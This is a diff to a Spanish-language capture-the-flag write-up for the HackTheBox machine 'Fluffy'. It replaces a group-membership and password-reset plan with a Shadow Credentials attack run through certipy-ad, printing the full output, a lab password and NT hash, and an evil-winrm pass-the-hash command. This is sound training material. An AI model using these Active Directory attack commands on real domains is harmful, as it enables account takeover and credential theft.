@@ -232,25 +232,45 @@ Ahora vamos a esa ruta de localhost, importamos el zip y esperamos. Cuando final
 
 ---
 
-**Objetivo**
-
-Aprovechar el control total de `p.agila` sobre el grupo para manipular la cuenta `j.coffey`:
-1. Eliminarlo del grupo para evitar que se bloquee la operación
-2. Cambiarle la contraseña
-3. (Opcional) Volver a incluirlo en el grupo
-4. Acceder como `j.coffey` y evaluar privilegios
-
----
-
-**Comandos utilizados**
+Durante esta fase, añadimos nuestra cuenta (`p.agila`) al grupo **`SERVICE ACCOUNTS`** del dominio, lo que nos otorgó permisos suficientes para abusar del ataque **Shadow Credentials** mediante Certipy. Específicamente, utilizamos `certipy-ad shadow auto` para **inyectar un certificado** malicioso en el atributo `msDS-KeyCredentialLink` de la cuenta objetivo `WINRM_SVC`. Esto nos permitió **suplantar su identidad mediante autenticación basada en certificados** (PKINIT), obteniendo un TGT válido sin necesidad de conocer su contraseña ni de crackear el hash Kerberos. Finalmente, una vez autenticados como `WINRM_SVC`, recuperamos su **hash NTLM completo**, lo que nos habilita para realizar ataques posteriores (como Pass-the-Hash, RDP, WinRM, o enumeración de privilegios adicionales). Tras completar el ataque, restauramos el atributo modificado para no dejar rastro evidente.
 
 ```bash
-# 1. Eliminar a j.coffey del grupo
-net rpc group delmem "SERVICE ACCOUNT MANAGERS" j.coffey -U 'p.agila%prometheusx-303' -S 10.10.11.69
+❯ net rpc group addmem "SERVICE ACCOUNTS@FLUFFY.HTB" "p.agila" -U 'p.agila%prometheusx-303' -S 10.10.11.69
+❯ sudo certipy-ad shadow auto -username p.agila@fluffy.htb -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip 10.10.11.69
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
-# 2. Cambiar la contraseña de j.coffey
-net rpc changepw j.coffey -U 'p.agila%prometheusx-303' -S 10.10.11.69
+[*] Targeting user 'winrm_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'e3224c71-f855-eb9a-b0dc-25281a6bd125'
+[*] Adding Key Credential with device ID 'e3224c71-f855-eb9a-b0dc-25281a6bd125' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID 'e3224c71-f855-eb9a-b0dc-25281a6bd125' to the Key Credentials for 'winrm_svc'
+[*] Authenticating as 'winrm_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'winrm_svc@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'winrm_svc.ccache'
+[*] Wrote credential cache to 'winrm_svc.ccache'
+[*] Trying to retrieve NT hash for 'winrm_svc'
+[*] Restoring the old Key Credentials for 'winrm_svc'
+[*] Successfully restored the old Key Credentials for 'winrm_svc'
+[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
+```
 
-# 3. (Opcional) Volver a añadirlo
-net rpc group addmem "SERVICE ACCOUNT MANAGERS" j.coffey -U 'p.agila%prometheusx-303' -S 10.10.11.69
+> Aunque `WINRM_SVC` era vulnerable a Kerberoasting (tenía SPN), no logramos crackear su contraseña. Sin embargo, al tener privilegios sobre su atributo `msDS-KeyCredentialLink`, realizamos un ataque Shadow Credentials para **inyectar un certificado, obtener un TGT y finalmente exfiltrar su hash NTLM**. Este proceso es **independiente de Kerberoasting** y no requiere fuerza bruta.
+
+Acontecemos ahora un Pass the Hash con evil-winrm:
+
+```bash
+vil-winrm -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767 -i 10.10.11.69
+```
+
+Y en el escritorio se encuentra la flag de usuario.
+
+![[Fluffy_6.png]]
+
 ### 3. Escalada de privilegios
+
